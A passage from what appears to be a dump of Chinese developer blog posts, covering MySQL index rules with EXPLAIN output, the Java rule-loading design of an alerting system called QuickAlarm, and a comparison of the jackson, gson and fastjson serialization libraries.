|+---------+------------+--------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| newuser | 0 | PRIMARY | 1 | userId | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_username | 1 | username | A | 3 | NULL | NULL | YES | BTREE | | || newuser | 1 | idx_nickname | 1 | nickname | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_email | 1 | email | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_phone | 1 | phone | A | 3 | NULL | NULL | | BTREE | | |+---------+------------+--------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+ 强制走索引的一种方式 语法： select * from table force index(索引) where xxx 1234567891011121314explain select * from newuser force index(PRIMARY) where userId not in (3, 2, 5);-- +----+-------------+---------+-------+---------------+---------+---------+------+------+-------------+-- | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |-- +----+-------------+---------+-------+---------------+---------+---------+------+------+-------------+-- | 1 | SIMPLE | newuser | range | PRIMARY | PRIMARY | 8 | NULL | 4 | Using where |-- +----+-------------+---------+-------+---------------+---------+---------+------+------+-------------+explain select * from newuser where userId not in (3, 2, 5);-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | 1 | SIMPLE | newuser | ALL | PRIMARY | NULL | NULL | NULL | 3 | Using where |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+ 2. 索引使用规则当一个表内有多个索引时，如何判断自己的sql是否走到了索引，走的是哪个索引呢？ 可以通过 explain 关键字来进行辅助判断，当然在实际写sql时，我们也有必要了解下索引匹配的规则，避免设置了一些冗余的索引，或者写出一些走不到索引的sql 测试的表结构如下 12345678910111213141516171819*************************** 1. row *************************** Table: newuserCreate Table: CREATE TABLE `newuser` ( `userId` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户id', `username` varchar(30) DEFAULT '' COMMENT '用户登录名', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '用户昵称', `password` varchar(50) DEFAULT '' COMMENT '用户登录密码 &amp; 密文根式', `address` text COMMENT '用户地址', `email` varchar(50) NOT NULL DEFAULT '' COMMENT '用户邮箱', `phone` bigint(20) NOT NULL DEFAULT '0' COMMENT '用户手机号', `img` varchar(100) DEFAULT '' COMMENT '用户头像', `extra` text, `isDeleted` tinyint(1) unsigned NOT NULL DEFAULT '0', `created` int(11) NOT NULL, `updated` int(11) NOT NULL, PRIMARY KEY (`userId`), KEY `idx_username` (`username`), KEY `idx_nickname_email_phone` (`nickname`,`email`,`phone`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 a. 最左前缀匹配原则这个主要是针对多列非聚簇索引而言，比如有下面这个索引idx_nickname_email_phone(nickname, email, phone), nickname 定义在email的前面，那么下面这几个语句对应的情况是 1234567891011121314151617181920212223-- 走索引explain select * from newuser where nickname='小灰灰' and email='greywolf@xxx.com';-- 1. 匹配nickname，可以走索引explain select * from newuser where nickname='小灰灰';-- 输出:-- +----+-------------+---------+------+--------------------+--------------------+---------+-------+------+-----------------------+-- | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |-- +----+-------------+---------+------+--------------------+--------------------+---------+-------+------+-----------------------+-- | 1 | SIMPLE | newuser | ref | idx_nickname_email | idx_nickname_email | 92 | const | 1 | Using index condition |-- +----+-------------+---------+------+--------------------+--------------------+---------+-------+------+-----------------------+-- 2. 虽然匹配了email, 但是不满足最左匹配，不走索引explain select * from newuser where email='greywolf@xxx.com';-- 输出-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | 1 | SIMPLE | newuser | ALL | NULL | NULL | NULL | NULL | 3 | Using where |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+ b. 无法跳过某个列使用后续索引列即对索引idx_nickname_email_phone(nickname, email, phone), 如果你的sql中，只有 nickname 和 phone, 那么phone走不到索引，因为不能跳过中间的email走索引 c. 范围查询后的列无法使用索引如 &gt;, &lt;, between, like这种就是范围查询，下面的sql中，email 和phone都无法走到索引，因为nickname使用了范围查询 1select * from newuser where nickname like '小灰%' and email='greywolf@xxx.com' and phone=15971112301 limit 10; d. 列作为函数参数或表达式的一部分12345678910-- 走不到索引explain select * from newuser where userId+1=2 limit 1;-- 输出-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+-- | 1 | SIMPLE | newuser | ALL | NULL | NULL | NULL | NULL | 3 | Using where |-- +----+-------------+---------+------+---------------+------+---------+------+------+-------------+ 3. 索引缺点 虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。 建立索引会占用磁盘空间的索引文件。一般情况这个问题不太严重，但如果你在一个大表上创建了多种组合索引，索引文件的会膨胀很快。 4. 注意事项 索引不会包含有NULL值的列 使用短索引 索引列排序 MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引 like语句操作 一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引而like “aaa%”可以使用索引 不要在列上进行运算 select * from users where YEAR(adddate)&lt;2007; 尽量不使用NOT IN和&lt;&gt;操作 5. sql使用策略a. 使用一个sql代替多个sql通常建议是使用一个sql来替代多个sql的查询 当然若sql执行效率很低，或者出现delete等导致锁表的操作时，也可以采用多个sql，避免阻塞其他sql b. 分解关联查询将关联join尽量放在应用中来做，尽量执行小而简单的的sql 分解后的sql简单，利于使用mysql缓存 执行分解后的sql，减少锁竞争 更好的扩展性和维护性（sql简单） 关联sql使用的是内嵌循环算法nestloop，而应用中可以使用hashmap等结构处理数据，效率更高 c. count count(*) 统计的是行数 count(列名) 统计的是列不为null的数量 d. limit limit offset, size; 分页查询，会查询出 offset + size 条数据，获取最后的size条数据 如 limit 1000, 20 则会查询出满足条件的1020条数据，然后将最后的20个返回，所以尽量避免大翻页查询 e. union需要将where、order by、limit 这些限制放入到每个子查询，才能重分提升效率。另外如非必须，尽量使用Union all，因为union会给每个子查询的临时表加入distinct，对每个临时表做唯一性检查，效率较差。 6. mysql使用查询a. 查看索引123-- 单位为GBSELECT CONCAT(ROUND(SUM(index_length)/(1024*1024*1024), 6), ' GB') AS 'Total Index Size'FROM information_schema.TABLES WHERE table_schema LIKE 'databaseName'; b. 查看表空间12SELECT CONCAT(ROUND(SUM(data_length)/(1024*1024*1024), 6), ' GB') AS 'Total Data Size' FROM information_schema.TABLES WHERE table_schema LIKE 'databaseName'; c. 查看数据库中所有表的信息1234567SELECT CONCAT(table_schema,'.',table_name) AS 'Table Name', table_rows AS 'Number of Rows', CONCAT(ROUND(data_length/(1024*1024*1024),6),' G') AS 'Data Size', CONCAT(ROUND(index_length/(1024*1024*1024),6),' G') AS 'Index Size' , CONCAT(ROUND((data_length+index_length)/(1024*1024*1024),6),' G') AS'Total' FROM information_schema.TABLES WHERE table_schema LIKE 'databaseName'; IV. 其他参考 深入理解Mysql——高性能索引与高性能SQL 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/22/mysql之索引的工作机制/"},{"title":"3. 报警系统QuickAlarm之报警规则的设定与加载","text":"前面一篇是报警执行器的定义与加载已经完成，但与之对应的报警规则有是如何定义和加载的呢？ 此外，既然命名为规则，那么就需要有对应的解析器，以根据报警规则和报警类型等相关输入条件，来选择对应的报警执行器，因此本文主要包括的内容就比较清晰了 报警规则的定义 报警规则的加载 报警规则的解析以及报警执行器选择 I. 报警规则定义 目前针对报警规则没有给出自定义配置的入口，即完全采用了默认的方案，后续可以考虑支持适用方来自定义报警规则以及解析器，这样扩展性就更强了 首先说明下我们的设计规则，我们针对不同的AlarmExecute定义了一个优先级，我们的目标是 针对报警频率设置不同区间，每个区间对应一种报警类型 当实际调用的报警频率达到这个区间，就选择这种报警类型 同时也允许关闭根据频率选择报警器的功能，全程用一个默认 每种报警类型的用户都可以自定义 针对上面的目标，我们设计的类就比较明确了 阀值类： 1234567891011121314151617181920212223242526272829303132@Getter@Setter@ToStringpublic class AlarmThreshold implements Comparable&lt;AlarmThreshold&gt; { /** * 报警类型，对应 {@link IExecute#getName()} */ private String alarmLevel; /** * 晋升此报警的阀值 */ private int threshold; /** * 对应的报警用户 */ private List&lt;String&gt; users; @Override public int compareTo(AlarmThreshold o) { if (o == null) { return -1; } return threshold - o.getThreshold(); }} 配置类： 12345678910111213141516171819202122232425262728293031323334353637383940414243@Getter@Setter@ToStringpublic class AlarmConfig { public static final int DEFAULT_MIN_NUM = 0; public static final int DEFAULT_MAX_NUM = 30; /** * 报警用户 */ private List&lt;String&gt; users; /** * 报警的阀值 */ private List&lt;AlarmThreshold&gt; alarmThreshold; /** * 最小的报警数 */ private int minLimit; /** * 最大的报警数 */ private int maxLimit; /** * 报警类型 {@link IExecute#getName()} */ private String alarmLevel; /** * true 表示当报警超过当前的阀值之后, 将提升报警的程度 */ private boolean autoIncEmergency;} 一个报警类型对应一个AlarmConfig，这样当执行报警时，就可以很容易的获取对应的规则 同样根据定义，也可以看出报警规则比较简单，直接根据阀值区间来选择 II. 报警规则加载关于如何加载报警规则，想了很久，选择把这块放开，因为我们无法确定，使用方的配置是存在什么地方的，而且使用的配置是否能和我们的设计的DO兼容也是个问题，因此干脆放手，同样是通过SPI的方式来做的 我们定义规则加载接口： IConfLoader 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public interface IConfLoader { /** * 加载配置到内存的操作，启动时，被调用 * * @return true 表示加载成功; false 表示加载失败 */ default boolean load() { return true; } /** * 排序，越小优先级越高 * &lt;p&gt; * 说明： 当系统中多个Loader存在时，会根据优先级来选择order最小的一个作为默认的Loader * * @return */ default int order() { return 10; } /** * 获取注册信息 * * @return */ RegisterInfo getRegisterInfo(); /** * 是否开启报警 * * @return */ boolean alarmEnable(); /** * 根据报警类型，获取对应的报警规则 * * @param alarmKey * @return */ AlarmConfig getAlarmConfig(String alarmKey);} 上面的方法，可以划分为两类: 加载时使用 load 为具体的执行加载配置到内存的方法，返回true表示加载成功 order 排序 getRegisterInfo 获取基础的配置信息（包括应用名等相关配置） 业务运行时使用 alarmEnable ： 是否开启报警 （当大量报警时，可以先关闭报警，然后再查问题） getAlarmConfig：核心方法，根据报警类型，返回对应的报警规则 系统默认提供一个从配置文件中加载报警规则的方案，主要会依赖两个配置文件 alarm.properties : 初始化注册信息，内部保存 RegisterInfo 所需要的属性 alarmConfig : 保存具体的报警规则，json格式 1. 配置加载配置加载的实现逻辑，如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class PropertiesConfLoader implements IConfLoader { private RegisterInfo registerInfo; private Map&lt;String, AlarmConfig&gt; cacheMap; public boolean load() { // 获取注册信息 registerInfo = RegisterInfoLoaderHelper.load(); if (registerInfo == null) { return false; } // 获取报警的配置类 File file; String path = registerInfo.getAlarmConfPath(); if (path.startsWith(\"/\")) { file = new File(path); } else { URL url = this.getClass().getClassLoader().getResource(path); file = new File(url.getFile()); } // 加载成功，才替换 cacheMap的内容； 主要是为了防止修改配置出现问题 Map&lt;String, AlarmConfig&gt; tmp = init(file); boolean ans = tmp != null; // 注册配置文件的变动 ans = ans &amp;&amp; PropertiesConfListenerHelper.registerConfChangeListener(file, this::init); if (ans) { cacheMap = tmp; } return ans; } private Map&lt;String, AlarmConfig&gt; init(File file) { try { // 正常来讲，是一个完整的json串 List&lt;String&gt; list = IOUtils.readLines(new FileInputStream(file), \"utf-8\"); String config = Joiner.on(\"\").join(list); return AlarmConfParse.parseConfig(config, Splitter.on(\",\").splitToList(registerInfo.getDefaultAlarmUsers())); } catch (IOException e) { log.error(\"load config into cacheMap error! e: {}\", e); return null; } } @Override public RegisterInfo getRegisterInfo() { return registerInfo; } @Override public boolean alarmEnable() { return true; } @Override public AlarmConfig getAlarmConfig(String alarmKey) { AlarmConfig config = cacheMap.get(alarmKey); if (config == null) { return cacheMap.get(AlarmConfParse.DEFAULT_ALARM_KEY); } else { return config; } }} 主要查看默认的load方法即可, alarmEnable 和 getAlarmConfig还是比较简单的，看一下就知道怎么玩的 2. RegisterInfo 加载上面的实现中，第一步就是从 alarm.properteis 文件中读取对应的配置，然后初始化 RegisterInfo对象 1234567891011@Datapublic class RegisterInfo implements Serializable { // 报警规则文件的路径，系统默认加载时，必填；否则选填 private String alarmConfPath; // 最大报警类型数，非必填，默认1000 private Integer maxAlarmType; // 默认报警用户， 必须 private String defaultAlarmUsers; // 应用名， 必须 private String appName;} 一个配置文件实例 1234appName=testalarmConfPath=/tmp/alarmConfigmaxAlarmType=1000defaultAlarmUsers=yihui 从配置文件中读取信息，然后初始化对象的过程就比较简单了，我这里做了一个小简化，使用反射的方式实现对象拷贝 123456789101112131415161718public static void copy(Properties source, Object dest) throws IllegalAccessException { Field[] fields = dest.getClass().getDeclaredFields(); for (Field f : fields) { // 不修改静态变量 if (Modifier.isStatic(f.getModifiers())) { continue; } f.setAccessible(true); // 值拷贝，因为不同数据类型的问题，所以需要对properties中获取的String类型转换一把 f.set(dest, parseObj(source.getProperty(f.getName()), f.getType())); }}// 强制类型转换private static &lt;T&gt; T parseObj(String obj, Class&lt;T&gt; clz) { return ParseFuncEnum.getFunc(clz).apply(obj);} 上面的实现目前比较简单，没有考虑父类的情况，没有考虑复杂的数据类型转换，目前只支持了基本类型的转换，后续可考虑抽象 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677public enum ParseFuncEnum { INT_PARSE(Arrays.asList(int.class, Integer.class)) { @Override public Function&lt;String, Integer&gt; getFunc() { return Integer::valueOf; } }, LONG_PARSE(Arrays.asList(long.class, Long.class)) { @Override public Function&lt;String, Long&gt; getFunc() { return Long::valueOf; } }, BOOLEAN_PARSE(Arrays.asList(boolean.class, Boolean.class)) { @Override public Function&lt;String, Boolean&gt; getFunc() { return Boolean::valueOf; } }, FLOAT_PARSE(Arrays.asList(float.class, Float.class)) { @Override public Function&lt;String, Float&gt; getFunc() { return Float::valueOf; } }, DOUBLE_PARSSE(Arrays.asList(double.class, Double.class)) { @Override public Function&lt;String, Double&gt; getFunc() { return Double::valueOf; } }, SHORT_PARSE(Arrays.asList(short.class, Short.class)) { @Override public Function&lt;String, Short&gt; getFunc() { return Short::valueOf; } }, BYTE_PARSE(Arrays.asList(byte.class, Byte.class)) { @Override public Function&lt;String, Byte&gt; getFunc() { return Byte::valueOf; } }, CHAR_PARSE(Arrays.asList(char.class, Character.class)) { @Override public Function&lt;String, Character&gt; getFunc() { return s -&gt; s.charAt(0); } }, STRING_PARSE(Arrays.asList(String.class)) { @Override public Function&lt;String, String&gt; getFunc() { return s -&gt; s; } },; private List&lt;Class&gt; clzList; public abstract &lt;T&gt; Function&lt;String, T&gt; getFunc(); private static Map&lt;Class, ParseFuncEnum&gt; map = new ConcurrentHashMap&lt;&gt;(20); static { for (ParseFuncEnum enu : ParseFuncEnum.values()) { for (Class clz : enu.clzList) { map.put(clz, enu); } } } ParseFuncEnum(List&lt;Class&gt; clz) { this.clzList = clz; } public static &lt;T&gt; Function&lt;String, T&gt; getFunc(Class&lt;T&gt; clz) { return map.get(clz).getFunc(); }} 3. 报警规则加载注册信息加载完毕之后，就可以获取报警规则的文件地址了，因此首先是读取配置规则的内容（我们要求是JSON格式），然后反序列化即可 将json串格式配置，反序列化为 BaseAlarmConf 对象 12345678910111213141516171819202122232425262728293031323334353637private static final TypeReference&lt;Map&lt;String, BasicAlarmConfig&gt;&gt; typeReference = new TypeReference&lt;Map&lt;String, BasicAlarmConfig&gt;&gt;() {};/** * 将json串格式的报警规则配置，映射为对应实体类 * &lt;p&gt; * 如果传如的是null, 则采用默认的兜底配置 * 如果传入的是非法的配置，直接返回null， 这样做的目的如下 * &lt;p&gt; * - 启动时，直接获知配置有问题，需要修改 * - 启动中，修改配置，此时新配置有问题，依然使用旧的配置 * * @param configs * @return */private static Map&lt;String, BasicAlarmConfig&gt; parseStrConfig2Map(String configs) { Map&lt;String, BasicAlarmConfig&gt; map = null; if (configs != null) { try { map = JSON.parseObject(configs, typeReference); } catch (Exception e) { logger.error(\"ConfigWrapper.parseStrConfig2Map() init config error! configs: {}, e:{}\", configs, e); return null; } } if (map == null) { map = new HashMap&lt;&gt;(1); } if (!map.containsKey(DEFAULT_ALARM_KEY)) { map.put(DEFAULT_ALARM_KEY, DEFAULT_ALARM_CONFIG); } return map;} 需要额外说明一下，json串并没有直接的映射我们前面定义的 AlarmConfig 对象，因为在原型版本的设计的过程中，考虑到配置与内部的使用对象，可能不是特别匹配，最初的设计中，是希望直接将AlarmConfig中的alarmLevel直接替换成 AlarmExecute 实例对象的，然而在实际实现中没有这么干…，所以看源码时，这里就有点奇怪，后面完全可以干掉这个无用的逻辑 此外，就是需要给一个默认的配置项，当报警类型匹配不到对应的报警规则时，就选择默认的了 下面是一个报警配置的demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899{ \"default\": { \"level\": \"LOG\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"yihui\", \"erhui\" ] }, { \"level\": \"LOG\", \"threshold\": 5, \"users\": [ \"yihui\", \"erhui\" ] } ], \"users\": [ \"yihui\" ] }, \"NPE\": { \"level\": \"WEIXIN\", \"autoIncEmergency\": false, \"max\": 30, \"min\": 0, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"3h ui\", \"4hui\" ] } ], \"users\": [ \"yihui\" ] }, \"XXX,YYY\": { \"level\": \"EMAIL\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"yihui\", \"erhui\" ] }, { \"level\": \"EMAIL\", \"threshold\": 5, \"users\": [ \"yihui@xxx.com\", \"erhui@xxx.com\" ] } ], \"users\": [ \"yihui@xxx.com\" ] }} III. ConfLoader选择并初始化前面说明，为了确保报警规则的多样性存储与加载，我们支持用户自定义加载类，所以就会有这么个ConfLoaderFactory, 来创建系统中使用的ConfLoader 12345678910111213141516171819202122232425262728293031323334353637383940public class ConfLoaderFactory { private static IConfLoader currentAlarmConfLoader; public static IConfLoader loader() { if (currentAlarmConfLoader == null) { synchronized (ConfLoaderFactory.class) { if (currentAlarmConfLoader == null) { initConfLoader(); } } } return currentAlarmConfLoader; } private static void initConfLoader() { Iterator&lt;IConfLoader&gt; iterator = ServiceLoader.load(IConfLoader.class).iterator(); List&lt;IConfLoader&gt; list = new ArrayList&lt;&gt;(); // 根据优先级进行排序，选择第一个加载成功的Loader while (iterator.hasNext()) { list.add(iterator.next()); } list.sort(Comparator.comparingInt(IConfLoader::order)); for (IConfLoader iConfLoader : list) { if (iConfLoader.load()) { currentAlarmConfLoader = iConfLoader; break; } } if (currentAlarmConfLoader == null) { throw new NoAlarmLoaderSpecifyException(\"no special alarmConfLoader selected!\"); } }} 实现逻辑依旧采取了SPI机制，不够我们定义了一个优先级，默认从最高优先级的开始加载，加载成功之后，就选择这个东西了；否则继续加载下一个，当所有的ConfLoader加载完毕，都没有一个成功的，就抛出一个异常 IV. 小结鉴于篇幅问题，关于报警规则与报警执行器之间的关系，对应的解释器放在下一篇进行说明，简要小结一下本文内容 报警规则： 采用阀值区间方式，将报警频率与报警执行器关联起来 规则加载： 支持SPI方式注入用户加载器，默认提供基于配置文件的加载器，且优先级最低 基本上本文说的就是下面这张图的内容了 V. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注，java分享","link":"/hexblog/2018/02/09/报警系统QuickAlarm之报警规则的设定与加载/"},{"title":"210715-Json序列化框架对比与最佳实践推荐","text":"Java 生态中，最最常见的json序列化工具有三个jackson, gson, fastsjon，当然我们常用的也就是这几个 https://mvnrepository.com/open-source/json-libraries json协议虽然是一致的，但是不同的框架对json的序列化支持却不尽相同，那么在项目中如何使用这些框架，怎样的使用才算优雅呢？ Spring本身提供了比较多这种case，比如RestTemplate, RedisTemplate，可以让底层的redis\\http依赖包无缝切换；因此我们在使用序列化框架的时，也应该尽量向它靠齐 以下为我认为在使用json序列化时，比较好的习惯 I. 推荐规范1. Java Bean实现Serializable接口遵循jdk的规范，如果一个Java Bean会被序列化（如对外提供VO/DTO对象）、持久化（如数据库实体Entity），建议实现Serializable接口，并持有一个serialVersionUID静态成员 123public class SimpleBean implements Serializable { private static final long serialVersionUID = -9111747337710917591L;} why? 声明为Serializable接口的对象，可以被序列化，jdk原生支持；一般来讲所有的序列化框架都认这个；如果一个对象没有实现这个接口，则不能保证所有的序列化框架都能正常序列化了 实现Serializable接口的，务必不要忘了初始化serialVersionUID(直接通过idea自动生成即可) idea设置自动生成提示步骤： settings -&gt; inspections -&gt; Serializable class without serialVersionUID 勾选 2. 忽略字段若实体中，某些字段不希望被序列化时，各序列化框架都有自己的支持方式，如: FastJson，使用JSONField注解 Gson，使用Expose注解 Jackson，使用JsonIgnore注解 12345678public class SimpleBean implements Serializable { private static final long serialVersionUID = -9111747337710917591L; // jackson 序列化时，如果 transient 关键字，也有 getter/setter方法，那么也会被序列化出来 @JsonIgnore @JSONField(serialize = false, deserialize = false) @Expose(serialize = false, deserialize = false) private transient SimpleBean self;} 这里强烈推荐使用jdk原生的关键字transient来修饰不希望被反序列化的成员 优点：通用性更强 重点注意 在使用jackson序列化框架时，成员变量如果有get方法，即便它被transient关键字修饰，输出json串的时候，也不会忽略它 说明链接: https://stackoverflow.com/questions/21745593/why-jackson-is-serializing-transient-member-also 两种解决办法: 12345678// case1objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true);// case2objectMapper.setVisibility(objectMapper.getSerializationConfig().getDefaultVisibilityChecker() .withFieldVisibility(JsonAutoDetect.Visibility.ANY) .withGetterVisibility(JsonAutoDetect.Visibility.NONE) .withIsGetterVisibility(JsonAutoDetect.Visibility.NONE)); 虽然jackson默认对transient关键字适配不友好，但是依然推荐使用这个关键字，然后添加上面的配置，这样替换json框架的时候，不需要修改源码 3. 不要用Map/List接收json串Java作为强类型语言在项目维护上有很高的优势，接收json串，推荐映射为对应的Java Bean，尽量不要用Map/List容器来接收，不然参数类型可能导致各种问题，可以看下面的默认值那一块说明 II. 不同框架的差异性接下来将重点关注下三个框架在我们日常使用场景下的区别，定义一个Java Bean 1234567891011121314151617181920212223242526272829@Data@Accessors(chain = true)public class SimpleBean implements Serializable { private static final long serialVersionUID = -9111747337710917591L; private Integer userId; private String userName; private double userMoney; private List&lt;String&gt; userSkills; private Map&lt;String, Object&gt; extra; private String empty; // jackson 序列化时，如果 transient 关键字，也有 getter/setter方法，那么也会被序列化出来 @JsonIgnore @JSONField(serialize = false, deserialize = false) @Expose(serialize = false, deserialize = false) private transient SimpleBean self; private String hello = \"你好\"; public SimpleBean() { this.self = this; }} 1. json字段映射缺失场景如果json字符串中，存在一个key，在定义的bean对象不存在时，上面三种序列化框架的表现形式也不一样 json串如下 1{\"extra\":{\"a\":\"123\",\"b\":345,\"c\":[\"1\",\"2\",\"3\"],\"d\":35.1},\"userId\":12,\"userMoney\":12.3,\"userName\":\"yh\",\"userSkills2\":[\"1\",\"2\",\"3\"]} 上面这个json中，userSkills2这个字段，和SimpleBean映射不上，如果进行反序列化，会出现下面的场景 fastjson, gson 会忽略json字符串中未匹配的key；jackson会抛异常 若jackson希望忽略异常，需要如下配置 12// 反序列化时，找不到属性时，忽略字段objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); 2. 字段没有get/set方法若某个private字段没有get/set方法时，这个字段在序列化与反序列化时，表现不一致（public修饰话都可以序列化） gson: 可以序列化 fastjson/jackson: 忽略这个字段 对于jackson，如果希望序列化一个没有get/set方法的属性时，如下设置 12objectMapper.setVisibility(objectMapper.getSerializationConfig().getDefaultVisibilityChecker() .withFieldVisibility(JsonAutoDetect.Visibility.ANY)); fastjson，貌似没有相关的方法 注意 建议对Java bean的字段添加get/set方法 若有 getXxx() 但是又没有属性xxx，会发现在序列化之后会多一个 xxx 3. value为null时，序列化时是否需要输出如果java bean中某个成员为null，默认表现如下 fastjson/gson: 忽略这个字段 jackson: 保存这个字段，只是value为null 如jackson对应的json串 123{ \"empty\": null} 通常来讲，推荐忽略null，对此jackson的设置如下 12// json串只包含非null的字段objectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL); 如果null也希望输出（比如Swagger接口文档，需要把所有的key都捞出来），如下设置 fastjson配置如下： 12// 输出hvalue为null的字段return JSONObject.toJSONString(obj, SerializerFeature.WriteMapNullValue); gson配置如下 123Gson gson = new GsonBuilder().serializeNulls().create();// 输出value为null的字段gson.toJson(map) 说明 一般来讲，在序列化的时候，推荐忽略value为null的字段 jackson默认不会忽略，需要设置关闭 4. 默认值将一个json串，转换为Map/List时，可以看到不同的数据类型与java数据类型的映射关系，下面是一些特殊的场景： json数据类型 fastjson gson jackson 浮点数 BigDecimal double double 整数 int/long double int/long 对象 JSONObject LinkedTreeMap LinkedHashMap 数组 JSONArray ArrayList ArrayList null null null null 输出Map HashMap LinkedTreeMap LinkedHashMap 如果希望三种框架保持一致，主要需要针对以下几个点： 浮点数 -》 double 整数 -》 int/long 数组 -》 ArrayList Map -》是否有序 输出map，虽然类型不一致，一般来说问题不大，最大的区别就是gson/jackson保证了顺序，而FastJson则没有 fastjson额外配置如下 1234// 禁用浮点数转BigDecimalint features = JSON.DEFAULT_PARSER_FEATURE &amp; ~Feature.UseBigDecimal.getMask();// 对象转Map，而不是JSONObjectfeatures = features | Feature.CustomMapDeserializer.getMask(); 数组转List而不是JSONArray，这个配置暂时未找到，可考虑自定义ObjectDeserializer来支持 Object转有序Map的配置也未找到， gson： https://stackoverflow.com/questions/15507997/how-to-prevent-gson-from-expressing-integers-as-floats 对于gson而言，也没有配置可以直接设置整数转int/long而不是double，只能自己来适配 123456789101112131415161718192021222324252627282930313233343536373839404142public class GsonNumberFixDeserializer implements JsonDeserializer&lt;Map&gt; { @Override public Map deserialize(JsonElement jsonElement, Type type, JsonDeserializationContext jsonDeserializationContext) throws JsonParseException { return (Map) read(jsonElement); } public Object read(JsonElement in) { if (in.isJsonArray()) { List&lt;Object&gt; list = new ArrayList&lt;&gt;(); JsonArray arr = in.getAsJsonArray(); for (JsonElement anArr : arr) { list.add(read(anArr)); } return list; } else if (in.isJsonObject()) { Map&lt;String, Object&gt; map = new LinkedTreeMap&lt;&gt;(); JsonObject obj = in.getAsJsonObject(); Set&lt;Map.Entry&lt;String, JsonElement&gt;&gt; entitySet = obj.entrySet(); for (Map.Entry&lt;String, JsonElement&gt; entry : entitySet) { map.put(entry.getKey(), read(entry.getValue())); } return map; } else if (in.isJsonPrimitive()) { JsonPrimitive prim = in.getAsJsonPrimitive(); if (prim.isBoolean()) { return prim.getAsBoolean(); } else if (prim.isString()) { return prim.getAsString(); } else if (prim.isNumber()) { Number num = prim.getAsNumber(); if (Math.ceil(num.doubleValue()) != num.longValue()) { return num.doubleValue(); } if (num.doubleValue() &gt; Integer.MAX_VALUE || num.doubleValue() &lt; Integer.MIN_VALUE) { return num.longValue(); } return num.longValue(); } } return null; }} 然后注册到Gson 123GsonBuilder gsonBuilder = new GsonBuilder();gsonBuilder.registerTypeAdapter(new TypeToken&lt;Map&gt;(){}.getType(), new GsonNumberFixDeserializer());Gson gson = gsonBuilder.create(); jackson 就没有什么好说的了 在json字符串映射到Java的Map/List容器时，获取到的数据对象和预期的可能不一样，不同的框架处理方式不同；所以最佳的实践是： json字符串映射到Java bean，而不是容器 如果映射到容器时，取数据时，做好类型兼容，完全遵循json的规范 String：对应java的字符串 boolean: 对应java的Boolean 数值：对应Java的double 原则上建议不要直接存数值类型，对于浮点数会有精度问题，用String类型进行替换最好 如确实为数值，为了保证不出问题，可以多绕一圈，如 Double.valueOf(String.valueOf(xxx)).xxxValue() 5. key非String类型一般来说不存在key为null的情况，但是map允许key为null，所以将一个map序列化为json串的时候，就有可能出现这种场景 FastJson 输出 1{null:\"empty key\", 12: \"12\"} Gson输出 1{\"null\":\"empty key\", \"12\": 